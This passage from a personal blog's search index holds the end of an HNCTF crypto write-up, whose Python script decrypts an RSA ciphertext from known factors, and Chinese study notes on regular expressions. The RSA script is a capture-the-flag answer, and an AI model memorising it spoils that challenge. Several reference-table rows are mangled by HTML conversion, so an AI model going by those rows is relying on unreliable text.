class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">625718246679843150194146350359795658237410693353450690028041</span></span><br><span class="line">p = <span class="number">768780063730500942699787302253</span></span><br><span class="line">q = <span class="number">813910604866037851538498611597</span></span><br><span class="line">c = <span class="number">118795719073790634455854187484104547013000179946116068066473</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span> (long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h2><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><h3 id="square"><a href="#square" class="headerlink" title="square"></a>square</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HNCTF </tag>
            
            <tag> WP </tag>
            
            <tag> CRYPTO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习正则表达式的一些笔记</title>
      <link href="/posts/628b.html"/>
      <url>/posts/628b.html</url>
      
        <content type="html"><![CDATA[<h1 id="学习正则表达式的一些笔记"><a href="#学习正则表达式的一些笔记" class="headerlink" title="学习正则表达式的一些笔记"></a>学习正则表达式的一些笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>emmm虽然正则表达式好像不是特别急需，但后面还是需要学的=-=，就在吃喝玩乐睡的假期抽空学习一下。 本章是阅读《正则表达式30分钟入门》的笔记</p><h2 id="界定符"><a href="#界定符" class="headerlink" title="界定符"></a>界定符</h2><p>指定正则表达式的开始和结束，可以当成是计算机语言中的大括号<code>&#123;</code>和<code>&#125;</code>。一般有三种表现方式：</p><ul><li>斜杠。例如<code>/[0-9]/</code>。这是最常用的方式，在PHP中，推荐使用这种方式。</li><li>井号。例如<code>#[0-9]</code>。</li><li>大括号。例如<code>&#123;[0-9]&#125;</code>。在正则表达式中，大括号还有其他作用，所以这种方式不推荐使用。</li></ul><h2 id="修饰符-修正模式"><a href="#修饰符-修正模式" class="headerlink" title="修饰符 | 修正模式"></a>修饰符 | 修正模式</h2><p>给正则表达式的匹配过程添加一种匹配模式，一般加在屁股比如：<code>/[a-z]/i</code></p><ul><li><code>U</code> 加<code>U</code>是懒惰匹配，不加<code>U</code>是默认的贪婪匹配。</li><li><code>i</code> 忽略英文字母大小写。</li><li><code>x</code> 忽略空白。（包括空格和按tab键输出的制表符）</li><li><code>s</code> 让元字符<code>.</code>匹配包括换行符在内的所有字符。</li><li><code>A</code>强制从目标字符串开头匹配</li><li><code>e</code> <code>preg_replace()</code>在替换字符串中对逆向引用作正常的替换。简单的说，就是PHP会把replace的结果当做PHP代码。（替换字符串要符合php的语法规范） 例如：<code>echo preg_replace(&#39;/(\d+),(\d+)/e&#39;, &#39;$1+$2&#39;, &#39;2,3&#39;);</code>会输出<code>5</code></li><li><code>g</code>全局匹配(但只匹单行) 若不带g，正则过程中字符串从左到右匹配，找到第一个符合条件的即匹配成功并返回 若带g，则字符串从左到右，找到每个符合条件的都记录下来，直到字符串结尾位置</li><li><code>m</code>多行匹配：若存在换行<code>\n</code>并且有开始<code>^</code>或结束<code>$</code>符的情况下，和<code>g</code>一起使用实现全局匹配。 存在换行时默认会把换行符作为一个字符任务匹配。 g只匹配第一行，添加m之后实现多行，每个换行符之后作为新的匹配起始</li></ul><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p><code>.</code> ：匹配除换行符以外的任意字符 <code>\w</code>：匹配字母或数字或下划线或汉字等 <code>\s</code>：匹配任意的空白符，包括空格，制表符(Tab)，换行符，中文全角空格 等 <code>\d</code>：匹配一位数字 <code>\b</code>：匹配单词的开始或结束。匹配这样一个位置：它的前一个字符和后一个字符不全是\w（一个是，一个不是或不存在） <code>^</code>：匹配字符串开始 <code>$</code>：匹配字符串结束 <code>(</code>和<code>)</code>：小括号有很多妙用，看下面吧</p><h2 id="反义"><a href="#反义" class="headerlink" title="反义"></a>反义</h2><p><code>\W</code> 匹配任意不是字母，数字，下划线，汉字的字符 <code>\S</code> 匹配任意不是空白符的字符 <code>\D</code> 匹配任意非数字的字符 <code>\B</code> 匹配不是单词开头或结束的位置 <code>[\^x]</code> 匹配除了x以外的任意字符 <code>[\^aeiou]</code> 匹配除了aeiou这几个字母以外的任意字符</p><h2 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h2><p><code>*</code> ：任意数量；重复0次或很多次 <code>+</code>：&gt;=1次；重复1次或很多次 <code>?</code>：0 or 1；重复0次或1次 <code>&#123;n&#125;</code>：n次；如：\d{2}（表示\d重复匹配2次）； <code>&#123;n,&#125;</code>：&gt;=n次；重复n次或更多次 <code>&#123;n,m&#125;</code>：重复n到m次；重复次数不少于n，不大于m</p><h2 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h2><p>若需要查找元字符本身如<code>.</code>、<code>*</code>这些，需要用<code>\</code>来将这些字符的特殊意义取消掉：如<code>\.</code>、<code>\*</code>；当然查找<code>\</code>本身也需要转义为<code>\\</code></p><h2 id="正则表达式字符类备忘单"><a href="#正则表达式字符类备忘单" class="headerlink" title="正则表达式字符类备忘单"></a>正则表达式字符类备忘单</h2><p>打ctf的时候碰到的正则匹配 ps：不过这个好像不是所有语言都适用？在使用正则测试小工具测试payload的时候就没能识别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[:alpha:]`任意字母, `[A-Za-z]` `[:upper:]`任意大写字母, `[A-Z]` `[:lower:]`任意小写字母, `[a-z]` `[:digit:]`任意数字, `[0-9]` `[:alnum:]`任意字符字母数字, `[A-Za-z0-9]` `[:xdigit:]`任意十六进制数字, `[0-9A-Fa-f]` `[:space:]`制表符，换行符，垂直制表符，换页，回车或空格 `[:blank:]`空格或制表符 `[:print:]`任意可打印字符 `[:punct:]`任意标点符号: `! &#x27; # S % &amp; &#x27; ( ) * + , - . / : ; &lt; = &gt; ? @ [ / ] ^ _ &#123; | &#125; ~` `[:graph:]`除space类之外的任意字符 `[:word:]`字母数字字符和下划线的连续字符串 `[:ascii:]`ASCII字符，范围：0-127 `[:cntrl:]`任何不属于字符类的字符: `[:upper:], [:lower:], [:alpha:], [:digit:], [:punct:], [:graph:], [:print:], [:xdigit:]</span><br></pre></td></tr></table></figure><h2 id="查找字符类"><a href="#查找字符类" class="headerlink" title="查找字符类"></a>查找字符类</h2><p>如查找abcde，只需在方括号中列出<code>[abcde]</code>;那么就构造了这样一个只会匹配abcde的字符集，数量由其后的重复次数决定</p><p>也可以指定范围： [0-9] 代表的含意与 \d 就是完全一致的：一位 数字； [a-z0-9A-Z_] 也完全等同于 \w （如果只考虑英文的话）。</p><h2 id="分支条件"><a href="#分支条件" class="headerlink" title="分支条件"></a>分支条件</h2><p>正则表达式里的分枝条件指的是有几种规则，如果满足其中任意一种规则都会进行匹配，具体方法是用 <code>|</code> 把不同的规则分隔开。如a | b，只要满足其中之一，都会进行匹配</p><h2 id="分组-子表达式"><a href="#分组-子表达式" class="headerlink" title="分组(子表达式)"></a>分组(子表达式)</h2><p>想要重复多个字符时，需要先用小括号进行分组，然后再指定这个分组的重复次数。 eg： <code>(\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;</code> 是一个简单的 IP 地址匹配表达式。 按下列顺序分析它： <code>\d&#123;1,3&#125;</code>匹配 1到3位的数字， <code>(\d&#123;1,3&#125;\.)&#123;3&#125;</code>匹配三位数字加上一个英文句号(这个整体也就是这个分组) 重复3次， 最后再加上一个一到三位的数字 <code>(\d&#123;1,3&#125;)</code> 。</p><p>IP地址中每个数字都不能大于255 且 01.02.03.04 这样前面带有0的数字, 也是正确的IP地址，IP 地址里的数字可以包含有前导 0 (leading zeroes). 不过上述正则表达式也会匹配 256.300.888.999 这种不可能存在的IP地址。 如果能使用算术比较的话，或许能简单地解决这个问题，但是正则表达式中并不提供关于数学的任何功能 所以只能使用冗长的分组，选择，字符类来描述一个正确的IP地址： <code>((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)</code></p><p>理解这个表达式的关键是理解 <code>2[0-4]\d|25[0-5]|[01]?\d\d?</code></p><p>解析：分成三部分：<code>2[0-4]\d</code>、<code>25[0-5]</code>、<code>[01]?\d\d?</code> <code>2[0-4]\d</code>：<strong>2</strong> + <strong>[0-4]中的任一个</strong> + <strong>任意数字</strong>；即：200-209、210-219、220-229、230-239、240-249 <code>25[0-5]：</code>：<strong>25</strong> + <strong>[0-5]任一个</strong>；即：250-255 <code>[01]?\d\d?：</code>：<strong>[01]?</strong> + <strong>\d</strong> + <strong>\d?</strong>;即0/1(不匹配或匹配1次)，加上任一数字，加上任一数字(不匹配或匹配1次)</p><h2 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h2><p>使用小括号指定一个子表达式后，匹配这个子表达式的文本(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。 也就是说可以对分组匹配到的文字进行处理</p><p>默认情况下，每个分组会自动拥有一个组号，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。</p><p>后向引用用于重复搜索前面某个分组匹配的文本。 例如： <code>\1</code> 代表分组1匹配的文本。 示例： <code>\b(\w+)\b\s+\1\b</code> 就可以可以用来匹配重复的单词，像go go, 或者kitty kitty。</p><p>解析： <code>(\b(\w+)\b)</code> :首先是一个单词（这个单词会被捕获到编号为1的分组中），也就是单词开始处和结束处之间数量多于一个的字母或数字 <code>(\s+)</code> ：然后是1个或几个空白符 <code>(\1)</code> ：最后是分组1中捕获的内容（也就是前面匹配的那个单词）</p><h3 id="自定义子表达式的组名"><a href="#自定义子表达式的组名" class="headerlink" title="自定义子表达式的组名"></a>自定义子表达式的组名</h3><p>子表达式的组名也可以自己定义：</p><p>使用语法形如： <code>(? &lt;Word&gt;\w+)</code> (或者把尖括号换成’也行： <code>(?&#39;Word&#39;\w+)</code>) 这样就把 <code>\w+</code> 的组名指定为 <code>Word</code> 了。</p><p>反向引用时：<code>\k&lt;Word&gt;</code></p><p>由此可以将上面的例子<code>\b(\w+)\b\s+\1\b</code>写为<code>\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b</code></p><h3 id="使用-的一些常用的特定语法"><a href="#使用-的一些常用的特定语法" class="headerlink" title="使用 () 的一些常用的特定语法"></a>使用 () 的一些常用的特定语法</h3><div class="table-container"><table><thead><tr><th>分类</th><th>代码<strong>/</strong>语法</th><th>说明</th></tr></thead><tbody><tr><td>捕获</td><td>(exp)</td><td>匹配exp,并捕获文本到<strong>自动命名</strong>的组里</td></tr><tr><td></td><td>(?exp) or (?’name’exp)</td><td>匹配exp,并捕获文本到名称为name的组里</td></tr><tr><td></td><td>(?:exp)</td><td>匹配exp,<strong>不捕获</strong>匹配的文本，也<strong>不给此分组分配组号</strong></td></tr><tr><td>零宽断言</td><td>(?=exp)</td><td>匹配<strong>exp前面</strong>的位置</td></tr><tr><td></td><td>(?&lt;=exp)</td><td>匹配<strong>exp后面</strong>的位置</td></tr><tr><td></td><td>(?!exp)</td><td>匹配<strong>后面</strong>跟的<strong>不是exp</strong>的位置</td></tr><tr><td></td><td>(?&lt;!exp)</td><td>匹配<strong>前面不是exp</strong>的位置</td></tr><tr><td>注释</td><td>(?#comment)</td><td>这种类型的分组不对正则表达式的处理产生任何影响，用于<strong>提供注释</strong>让人阅读</td></tr></tbody></table></div><h2 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h2><p>就是用于查找在某些内容(不包括这些内容)之前或之后的东西，即指定内容前/后的位置，并且该位置需满足一定条件（断言）；故综合称之为零宽断言。</p><p><code>(?=exp)</code>（零宽度<strong>正</strong>预测<strong>先行</strong>断言）：断言自身出现的位置的<strong>后面</strong>能匹配表达式exp</p><blockquote><p>比如：<code>\b\w+(?=ing\b)</code>，匹配<strong>以ing结尾</strong>的单词的前面部分(<strong>除了ing以外的部分</strong>)，</p><p>如查找<em>I’m singing while you’re dancing.</em>时，它会匹配<strong>sing</strong>和<strong>danc</strong>。</p></blockquote><p><code>(?&lt;=exp)</code>（零宽度<strong>正</strong>回顾<strong>后发</strong>断言）：断言自身出现的位置的<strong>前面</strong>能匹配表达式 exp</p><blockquote><p>比如：<code>(?&lt;=\bre)\w+\b</code>会匹配<strong>以re开头</strong>的单词的后半部分(<strong>除了re以外的部分</strong>)，</p><p>例如在查找<em>reading a book</em>时，它匹配<strong>ading</strong>。</p></blockquote><h2 id="负向零宽断言"><a href="#负向零宽断言" class="headerlink" title="负向零宽断言"></a>负向零宽断言</h2><p><code>(?!exp)</code>（零宽度<strong>负</strong>预测<strong>先行</strong>断言）：断言此位置的<strong>后面不能匹配</strong>表达式exp</p><blockquote><p>比如：</p><p><code>\d&#123;3&#125;(?!\d)</code>匹配三位数字，而且这三位数字的后面不能是数字；</p><p><code>\b((?!abc)\w)+\b</code>匹配不包含连续字符串abc的单词。</p></blockquote><p><code>(?&lt;!exp)</code>（零宽度<strong>负</strong>回顾<strong>后发</strong>断言）：断言此位置的<strong>前面不能匹配</strong>表达式exp</p><blockquote><p>比如：</p><p><code>(?&lt;![a-z])\d&#123;7&#125;</code>匹配前面不是小写字母的七位数字。</p><p><code>(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)</code>匹配不包含属性的简单HTML标签内里的内容</p><p>解析： <code>(?&lt;=&lt;(\w+)&gt;)</code>指定了<strong>前缀</strong>：被尖括号括起来的单词(比如可能是<code>&lt;b&gt;</code>)， <code>.</code> <code>*</code>(任意的字符串),最后是一个<strong>后缀</strong><code>(?=&lt;\/\1&gt;)</code>。 后缀里的<code>\/</code>用到了前面提过的字符转义； <code>\1</code>是一个反向引用，引用捕获的第一组，前面 <code>(\w+)</code> 匹配的内容</p><p>这样如果前缀实际上是 <code>&lt;b&gt;</code> 的话，后缀就是 <code>&lt;/b&gt;</code> 了。</p><p>整个表达式匹配的是 <code>&lt;b&gt;</code> 和 <code>&lt;/b&gt;</code> 之间的内容(不包括前缀和后缀本身)。</p></blockquote><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>通过语法<code>(?#comment)</code>来包含注释</p><blockquote><p>比如：<code>2[0-4]\d(?#200-249)|25[0-5](?#250-255)|[01]?\d\d?(?#0-199)</code></p></blockquote><p>要包含注释的话，最好是启用“忽略模式里的空白符”选项，这样在编写表达式时能任意的添加空格，Tab，换行，而实际使用时这些都将被忽略。 启用这个选项后，在#后面到这一行结束的所有文本都将被当成注释忽略掉。</p><p>例如，我们可以将前面的一个表达式写成这样：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(?&lt;=    # 断言要匹配的文本的前缀</span><br><span class="line">&lt;(\w+)&gt; # 查找尖括号括起来的内容</span><br><span class="line">        # (即HTML/XML标签)</span><br><span class="line">)       # 前缀结束</span><br><span class="line">.*      # 匹配任意文本</span><br><span class="line">(?=     # 断言要匹配的文本的后缀</span><br><span class="line">&lt;\/\1&gt;  # 查找尖括号括起来的内容</span><br><span class="line">        # 查找尖括号括起来的内容</span><br><span class="line">)       # 后缀结束</span><br></pre></td></tr></table></figure><h2 id="贪婪与懒惰"><a href="#贪婪与懒惰" class="headerlink" title="贪婪与懒惰"></a>贪婪与懒惰</h2><h3 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h3><p>当正则表达式中包含能接受重复的限定符时，通常的行为是匹配尽可能多的字符（在使整个表达式能得到匹配的前提下）</p><p>如：<code>a.*b</code>会匹配最长的 以a开始，b结束 的字符串； 当以此对aabab进行搜索，就会匹配整个字符串aabab</p><h3 id="懒惰匹配"><a href="#懒惰匹配" class="headerlink" title="懒惰匹配"></a>懒惰匹配</h3><p>也就是是匹配尽可能少的字符。 只需在限定符后加上<code>?</code>即可转换为懒惰匹配模式</p><p>如<code>a.*?b</code>匹配最短的 以a开始，b结束 的字符串； 当以此对aabab进行搜索，就会匹配aab和ab</p><h4 id="懒惰限定符："><a href="#懒惰限定符：" class="headerlink" title="懒惰限定符："></a>懒惰限定符：</h4><div class="table-container"><table><thead><tr><th>代码<strong>/</strong>语法</th><th>说明</th></tr></thead><tbody><tr><td>*?</td><td>重复任意次，但尽可能少重复</td></tr><tr><td>+?</td><td>重复1次或更多次，但尽可能少重复</td></tr><tr><td>??</td><td>重复0次或1次，但尽可能少重复</td></tr><tr><td>{n,m}?</td><td>重复n到m次，但尽可能少重复</td></tr><tr><td>{n,}?</td><td>重复n次以上，但尽可能少重复</td></tr></tbody></table></div><h2 id="处理选项（基于python）"><a href="#处理选项（基于python）" class="headerlink" title="处理选项（基于python）"></a>处理选项（基于python）</h2><p>Python 中常用的正则表达式选项（用到re模块！）：</p><div class="table-container"><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>re.IGNORECASE</td><td>匹配时不区分大小写。</td></tr><tr><td>re.MULTILINE</td><td>更改\^和$的含义，使它们分别在任意一行的行首和行尾匹配，而不仅仅在整个字符串的开头和结尾匹配。(在此模式下,$的精确含意是:匹配\n之前的位置以及字符串结束前的位置.)</td></tr><tr><td>re.DOTALL</td><td>更改.的含义，使它与每一个字符匹配（包括换行符\n）。</td></tr><tr><td>re.VERBOSE</td><td>忽略表达式中的非转义空白并启用由#标记的注释。</td></tr><tr><td>re.DEBUG</td><td>显示编译表达式的 debug 信息</td></tr></tbody></table></div><h2 id="平衡组-amp-递归匹配"><a href="#平衡组-amp-递归匹配" class="headerlink" title="平衡组&amp;递归匹配"></a>平衡组&amp;递归匹配</h2><p><strong>使用场景</strong>：匹配嵌套字符串，如匹配类中的大括号，HTML中的尖括号等</p><p><code>(?&#39;group&#39;)</code> 把捕获的内容命名为group,并压入堆栈(Stack)</p><p><code>(?&#39;-group&#39;)</code> 从堆栈上弹出最后压入堆栈的名为group的捕获内容，如果堆栈本来为空，则本分组的匹配失败</p><p><code>(?(group)yes|no)</code> 如果堆栈上存在以名为group的捕获内容的话，继续匹配yes部分的表达式，否则继续匹配no部分</p><p><code>(?!)</code> 零宽负向先行断言，由于没有后缀表达式，试图匹配总是失败</p><p>我们要做的是：</p><p>每碰到了左括号，就在压入一个”Open”, 每碰到一个右括号，就弹出一个，到了最后就看看堆栈是否为空；</p><p>不为空 -》证明左括号比右括号多，那匹配就应该失败。</p><p>正则表达式引擎会进行回溯(放弃最前面或最后面的一些字符)，尽量使整个表达式得到匹配</p><h2 id="正则表达式手册"><a href="#正则表达式手册" class="headerlink" title="正则表达式手册"></a>正则表达式手册</h2><h3 id="表达式全集"><a href="#表达式全集" class="headerlink" title="表达式全集"></a>表达式全集</h3><div class="table-container"><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>\</td><td>将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，“<code>n</code>”匹配字符“<code>n</code>”。“<code>\n</code>”匹配一个换行符。串行“<code>\\</code>”匹配“<code>\</code>”而“<code>\(</code>”则匹配“<code>(</code>”。</td></tr><tr><td>^</td><td>匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性，^也匹配“<code>\n</code>”或“<code>\r</code>”之后的位置。</td></tr><tr><td>\</td><td></td><td>匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性，也匹配“<code>\n</code>”或“<code>\r</code>”之前的位置。</td></tr><tr><td>*</td><td>匹配前面的子表达式零次或多次。例如，zo<em>能匹配“<code>z</code>”以及“<code>zoo</code>”。</em>等价于{0,}。</td></tr><tr><td>+</td><td>匹配前面的子表达式一次或多次。例如，“<code>zo+</code>”能匹配“<code>zo</code>”以及“<code>zoo</code>”，但不能匹配“<code>z</code>”。+等价于{1,}。</td></tr><tr><td>?</td><td>匹配前面的子表达式零次或一次。例如，“<code>do(es)?</code>”可以匹配“<code>does</code>”或“<code>does</code>”中的“<code>do</code>”。?等价于{0,1}。</td></tr><tr><td>{<em>n</em>}</td><td><em>n</em>是一个非负整数。匹配确定的<em>n</em>次。例如，“<code>o&#123;2&#125;</code>”不能匹配“<code>Bob</code>”中的“<code>o</code>”，但是能匹配“<code>food</code>”中的两个o。</td></tr><tr><td>{<em>n</em>,}</td><td><em>n</em>是一个非负整数。至少匹配<em>n</em>次。例如，“<code>o&#123;2,&#125;</code>”不能匹配“<code>Bob</code>”中的“<code>o</code>”，但能匹配“<code>foooood</code>”中的所有o。“<code>o&#123;1,&#125;</code>”等价于“<code>o+</code>”。“<code>o&#123;0,&#125;</code>”则等价于“<code>o*</code>”。</td></tr><tr><td>{<em>n</em>,<em>m</em>}</td><td><em>m</em>和<em>n</em>均为非负整数，其中<em>n</em>&lt;=<em>m</em>。最少匹配<em>n</em>次且最多匹配<em>m</em>次。例如，“<code>o&#123;1,3&#125;</code>”将匹配“<code>fooooood</code>”中的前三个o。“<code>o&#123;0,1&#125;</code>”等价于“<code>o?</code>”。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td>?</td><td>当该字符紧跟在任何一个其他限制符（<em>,+,?，{</em>n<em>}，{</em>n<em>,}，{</em>n<em>,</em>m*}）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串“<code>oooo</code>”，“<code>o+?</code>”将匹配单个“<code>o</code>”，而“<code>o+</code>”将匹配所有“<code>o</code>”。</td></tr><tr><td>.</td><td>匹配除“<code>\</code><em><code>n</code></em>”之外的任何单个字符。要匹配包括“<code>\</code><em><code>n</code></em>”在内的任何字符，请使用像“`(.</td></tr><tr><td>(pattern)</td><td>匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到，在VBScript中使用SubMatches集合，在JScript中则使用$0…$9属性。要匹配圆括号字符，请使用“<code>\(</code>”或“<code>\)</code>”。</td></tr><tr><td>(?:pattern)</td><td>匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符“`(</td></tr><tr><td>(?=pattern)</td><td>正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“`Windows(?=95</td></tr><tr><td>(?!pattern)</td><td>正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如“`Windows(?!95</td></tr><tr><td>(?&lt;=pattern)</td><td>反向肯定预查，与正向肯定预查类拟，只是方向相反。例如，“`(?&lt;=95</td></tr><tr><td>(?&lt;!pattern)</td><td>反向否定预查，与正向否定预查类拟，只是方向相反。例如“`(?&lt;!95</td></tr><tr><td>x\</td><td>y</td><td>匹配x或y。例如，“`z</td></tr><tr><td>[xyz]</td><td>字符集合。匹配所包含的任意一个字符。例如，“<code>[abc]</code>”可以匹配“<code>plain</code>”中的“<code>a</code>”。</td></tr><tr><td><a href="https://na0h.cn/笔记/学习正则表达式的一些笔记#fn-xyz">xyz</a></td><td>负值字符集合。匹配未包含的任意字符。例如，“<code>[^abc]</code>”可以匹配“<code>plain</code>”中的“<code>p</code>”。</td></tr><tr><td>[a-z]</td><td>字符范围。匹配指定范围内的任意字符。例如，“<code>[a-z]</code>”可以匹配“<code>a</code>”到“<code>z</code>”范围内的任意小写字母字符。</td></tr><tr><td><a href="https://na0h.cn/笔记/学习正则表达式的一些笔记#fn-a-z">a-z</a></td><td>负值字符范围。匹配任何不在指定范围内的任意字符。例如，“<code>[^a-z]</code>”可以匹配任何不在“<code>a</code>”到“<code>z</code>”范围内的任意字符。</td></tr><tr><td>\b</td><td>匹配一个单词边界，也就是指单词和空格间的位置。例如，“<code>er\b</code>”可以匹配“<code>never</code>”中的“<code>er</code>”，但不能匹配“<code>verb</code>”中的“<code>er</code>”。</td></tr><tr><td>\B</td><td>匹配非单词边界。“<code>er\B</code>”能匹配“<code>verb</code>”中的“<code>er</code>”，但不能匹配“<code>never</code>”中的“<code>er</code>”。</td></tr><tr><td>\cx</td><td>匹配由x指明的控制字符。例如，\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则，将c视为一个原义的“<code>c</code>”字符。</td></tr><tr><td>\d</td><td>匹配一个数字字符。等价于[0-9]。</td></tr><tr><td>\D</td><td>匹配一个非数字字符。等价于<a href="https://na0h.cn/笔记/学习正则表达式的一些笔记#fn-0-9">0-9</a>。</td></tr><tr><td>\f</td><td>匹配一个换页符。等价于\x0c和\cL。</td></tr><tr><td>\n</td><td>匹配一个换行符。等价于\x0a和\cJ。</td></tr><tr><td>\r</td><td>匹配一个回车符。等价于\x0d和\cM。</td></tr><tr><td>\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。</td></tr><tr><td>\S</td><td>匹配任何非空白字符。等价于<sup><a href="#fn_ \f\n\r\t\v" id="reffn_ \f\n\r\t\v"> \f\n\r\t\v</a></sup>。</td></tr><tr><td>\t</td><td>匹配一个制表符。等价于\x09和\cI。</td></tr><tr><td>\v</td><td>匹配一个垂直制表符。等价于\x0b和\cK。</td></tr><tr><td>\w</td><td>匹配包括下划线的任何单词字符。等价于“<code>[A-Za-z0-9_]</code>”。</td></tr><tr><td>\W</td><td>匹配任何非单词字符。等价于“<code>[^A-Za-z0-9_]</code>”。</td></tr><tr><td>\x<em>n</em></td><td>匹配<em>n</em>，其中<em>n</em>为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，“<code>\x41</code>”匹配“<code>A</code>”。“<code>\x041</code>”则等价于“<code>\x04&amp;1</code>”。正则表达式中可以使用ASCII编码。.</td></tr><tr><td><em>num</em></td><td>匹配<em>num</em>，其中<em>num</em>是一个正整数。对所获取的匹配的引用。例如，“<code>(.)\1</code>”匹配两个连续的相同字符。</td></tr><tr><td><em>n</em></td><td>标识一个八进制转义值或一个向后引用。如果<em>n</em>之前至少<em>n</em>个获取的子表达式，则<em>n</em>为向后引用。否则，如果<em>n</em>为八进制数字（0-7），则<em>n</em>为一个八进制转义值。</td></tr><tr><td><em>nm</em></td><td>标识一个八进制转义值或一个向后引用。如果<em>nm</em>之前至少有<em>nm</em>个获得子表达式，则<em>nm</em>为向后引用。如果*nm<em>之前至少有</em>n<em>个获取，则</em>n<em>为一个后跟文字</em>m<em>的向后引用。如果前面的条件都不满足，若</em>n<em>和</em>m<em>均为八进制数字（0-7），则</em>nm<em>将匹配八进制转义值</em>nm*。</td></tr><tr><td><em>nml</em></td><td>如果<em>n</em>为八进制数字（0-3），且<em>m和l</em>均为八进制数字（0-7），则匹配八进制转义值<em>nm</em>l。</td></tr><tr><td>\u<em>n</em></td><td>匹配<em>n</em>，其中<em>n</em>是一个用四个十六进制数字表示的Unicode字符。例如，\u00A9匹配版权符号（©）。</td></tr></tbody></table></div><h3 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h3><div class="table-container"><table><thead><tr><th>用户名</th><th>/^[a-z0-9_-]{3,16}$/</th></tr></thead><tbody><tr><td>密码</td><td>/^[a-z0-9_-]{6,18}$/</td></tr><tr><td>十六进制值</td><td>/^#?([a-f0-9]{6}\</td><td>[a-f0-9]{3})$/</td></tr><tr><td>电子邮箱</td><td>/^([a-z0-9_.-]+)@([\da-z.-]+).([a-z.]{2,6})$/ /^[a-z\d]+(.[a-z\d]+)*@(<a href="https://na0h.cn/笔记/-[/da-z]">\da-z</a>?)+(.{1,2}[a-z]+)+$/</td></tr><tr><td>URL</td><td>/^(https?:\/\/)?([\da-z.-]+).([a-z.]{2,6})([\/\w .-]<em>)</em>\/?$/</td></tr><tr><td>IP 地址</td><td>/((2[0-4]\d\</td><td>25[0-5]\</td><td>[01]?\d\d?).){3}(2[0-4]\d\</td><td>25[0-5]\</td><td>[01]?\d\d?)/ /^(?:(?:25[0-5]\</td><td>2[0-4][0-9]\</td><td>[01]?[0-9][0-9]?).){3}(?:25[0-5]\</td><td>2[0-4][0-9]\</td><td>[01]?[0-9][0-9]?)$/</td></tr><tr><td>HTML 标签</td><td>/^<a href="([a-z]+)([&lt;](https://na0h.cn/笔记/学习正则表达式的一些笔记#fn-&lt;)+)*(?:">([a-z]+)([&lt;](https://na0h.cn/笔记/学习正则表达式的一些笔记#fn-&lt;)+)*(?:</a>(.*)&lt;\/\1&gt;\</td><td>\s+\/&gt;)$/</td></tr><tr><td>删除代码\注释</td><td>(?&lt;!http:\</td><td>\S)//.*$</td></tr><tr><td>Unicode编码中的汉字范围</td><td>/^[\u2E80-\u9FFF]+$/</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git的基本使用</title>
      <link href="/posts/73d8.html"/>
      <url>/posts/73d8.html</url>
      
